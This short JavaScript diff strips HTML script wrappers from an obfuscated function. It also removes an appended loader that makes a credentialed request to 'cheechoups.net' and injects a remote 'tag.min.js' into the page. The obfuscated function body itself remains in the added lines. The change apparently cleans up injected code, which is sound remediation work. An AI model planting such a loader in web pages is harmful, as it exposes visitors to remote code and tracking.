@@ -1,4 +1,4 @@
-< script data - cfasync = "false"type = "text/javascript" > (function($, document) {
+(function($, document) {
     for ($._Ff = $.BD; $._Ff < $.GD; $._Ff += $.x) {
         switch ($._Ff) {
         case $.GE:
@@ -4342,4 +4342,4 @@ function(n, y) {
         }
     }
     return _;
-})(document)) < /script><script>(function(d,z,x,s,e,o){s.src='/ / '+d+' / tag.min.js ';x.withCredentials=true;x.open('GET ',' //'+d+'/5/'+z+'/?oo=1&aab=1',!0);s.onerror=x.onerror=E;s.onload=x.onload=g;x.send();(document.body||document.documentElement).appendChild(s);function g(){o=this.response?JSON.parse(this.response):o;o&&window.kkp4a5x5tv&&window.kkp4a5x5tv(o);}function E(){e&&e();e=null;}})('cheechoups.net',3763521,new XMLHttpRequest(),document.createElement('script'),_wyjoionf)</script>
+})(document)) 
